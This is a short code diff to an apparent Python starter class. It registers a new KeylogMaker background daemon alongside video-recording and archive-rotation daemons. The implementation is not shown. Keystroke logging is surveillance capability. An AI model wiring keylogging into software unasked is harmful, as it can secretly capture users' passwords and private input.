@@ -9,6 +9,7 @@ from config import config
 from core import logger, utils
 from service.videomaker import VideoMaker
 from service.arcrotator import ArchiveRotator
+from service.keylogmaker import KeylogMaker
 from core.init_core import Generator
 
 
@@ -24,6 +25,7 @@ class Starter():
         self.daemons = []
         self.daemons.append(VideoMaker())
         self.daemons.append(ArchiveRotator())
+        self.daemons.append(KeylogMaker())
         Generator().main()
 
     def signal_term(self, signum, frame):
